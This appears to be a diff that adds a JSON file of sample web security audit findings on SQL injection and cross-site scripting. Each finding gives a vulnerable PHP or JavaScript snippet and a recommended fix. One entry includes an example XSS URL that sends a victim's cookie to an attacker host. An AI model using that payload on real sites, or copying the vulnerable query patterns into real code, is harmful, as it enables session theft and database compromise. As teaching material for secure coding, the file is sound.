@@ -1,0 +1,60 @@
+{
+  "sqlInjection": [
+    {
+      "title": "SQL Injection in Login Form",
+      "severity": "Critical",
+      "location": "/login.php",
+      "description": "The login form is vulnerable to SQL injection attacks. User input is not properly sanitized before being used in SQL queries.",
+      "impact": "An attacker could bypass authentication, extract sensitive data, or execute arbitrary SQL commands on the database.",
+      "recommendation": "Use prepared statements or parameterized queries instead of directly incorporating user input into SQL queries. Implement input validation and sanitization.",
+      "code": "$username = $_POST['username'];\n$password = $_POST['password'];\n\n// Vulnerable code\n$query = \"SELECT * FROM users WHERE username='$username' AND password='$password'\";\n$result = mysqli_query($connection, $query);"
+    },
+    {
+      "title": "SQL Injection in Search Function",
+      "severity": "High",
+      "location": "/search.php",
+      "description": "The search function is vulnerable to SQL injection. User input from the search field is inserted directly into SQL queries.",
+      "impact": "Attackers could extract sensitive data, modify database contents, or potentially gain access to the underlying server.",
+      "recommendation": "Use prepared statements with parameterized queries. Apply proper input validation and consider using an ORM (Object-Relational Mapping) library.",
+      "code": "$searchTerm = $_GET['q'];\n\n// Vulnerable code\n$query = \"SELECT * FROM products WHERE name LIKE '%$searchTerm%' OR description LIKE '%$searchTerm%'\";\n$result = mysqli_query($connection, $query);"
+    },
+    {
+      "title": "Blind SQL Injection Vulnerability",
+      "severity": "Medium",
+      "location": "/profile.php",
+      "description": "The profile page is vulnerable to blind SQL injection attacks through the user ID parameter.",
+      "impact": "Even without direct error messages, attackers can extract data by observing differences in application responses.",
+      "recommendation": "Use parameterized queries and implement proper input validation. Consider using a Web Application Firewall (WAF) as an additional security layer.",
+      "code": "$userId = $_GET['id'];\n\n// Vulnerable code\n$query = \"SELECT * FROM user_profiles WHERE user_id = $userId\";\n$result = $db->query($query);"
+    }
+  ],
+  "xss": [
+    {
+      "title": "Stored XSS in Comment System",
+      "severity": "Critical",
+      "location": "/comments.php",
+      "description": "The comment system stores user input without proper sanitization, allowing attackers to inject malicious JavaScript.",
+      "impact": "Attackers can steal session cookies, redirect users to malicious sites, or perform actions on behalf of other users.",
+      "recommendation": "Sanitize user input before storing in the database. Use HTML encoding when displaying user-generated content. Consider using a Content Security Policy.",
+      "code": "// PHP code that stores comments\n$comment = $_POST['comment'];\n\n// Vulnerable code - directly storing user input\n$query = \"INSERT INTO comments (user_id, comment_text) VALUES ($userId, '$comment')\";\nmysqli_query($connection, $query);\n\n// JavaScript that displays comments\ndocument.getElementById('comments').innerHTML = data.commentHtml; // Insecure"
+    },
+    {
+      "title": "Reflected XSS in Error Messages",
+      "severity": "High",
+      "location": "/error.php",
+      "description": "Error messages reflect user input without proper encoding, allowing for XSS attacks via specifically crafted URLs.",
+      "impact": "Attackers can create malicious links that execute JavaScript in victims' browsers when clicked.",
+      "recommendation": "Encode all output that contains user input. Use a templating system that automatically escapes output.",
+      "code": "// Vulnerable code\nif (!isset($_GET['id'])) {\n  echo \"<div class='error'>Missing parameter: \" . $_GET['parameter'] . \"</div>\";\n}\n\n// Example attack URL:\n// error.php?parameter=<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>"
+    },
+    {
+      "title": "DOM-based XSS Vulnerability",
+      "severity": "Medium",
+      "location": "/js/main.js",
+      "description": "Client-side JavaScript code insecurely processes URL fragment identifiers, leading to DOM-based XSS.",
+      "impact": "Attackers can execute arbitrary JavaScript by crafting specific URLs with malicious fragments.",
+      "recommendation": "Use safe DOM manipulation methods and sanitize all data before inserting it into the DOM.",
+      "code": "// Vulnerable code\nconst value = window.location.hash.substring(1);\ndocument.getElementById('output').innerHTML = decodeURIComponent(value);\n\n// Safer alternative\ndocument.getElementById('output').textContent = decodeURIComponent(value);"
+    }
+  ]
+}
